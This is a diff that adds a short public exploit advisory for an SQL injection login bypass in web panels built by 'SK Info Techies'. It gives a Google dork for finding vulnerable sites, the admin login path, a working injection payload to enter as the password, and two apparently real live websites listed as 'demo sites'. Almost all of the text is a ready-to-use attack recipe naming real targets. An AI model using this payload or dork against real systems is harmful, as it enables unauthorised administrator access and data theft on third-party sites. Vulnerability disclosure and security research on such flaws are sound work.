@@ -1,0 +1,22 @@
+*********************************************************
+#Exploit Title: SK Info Techies -  Bypas Sql Login Vulnerability
+#Date: 2022-07-11
+#Exploit Author: Lutfie404
+#Google Dork: intext:"Developed by SK Info Techies"
+#The Login URL is: site.com/panel
+#Category:webapps
+
+*********************************************************
+Proof of Concept:
+Search google Dork: intext:"Developed by SK Info Techies"
+
+access admin login at: site.com/panel
+
+Login With This Detail:
+user: admin@gmail.com
+password: ' or 1=1 limit 1 -- -+
+
+*********************************************************
+### Demo Site :
+https://cgtes.com/panel/
+https://www.lovinlifehealthcareservices.com/panel/
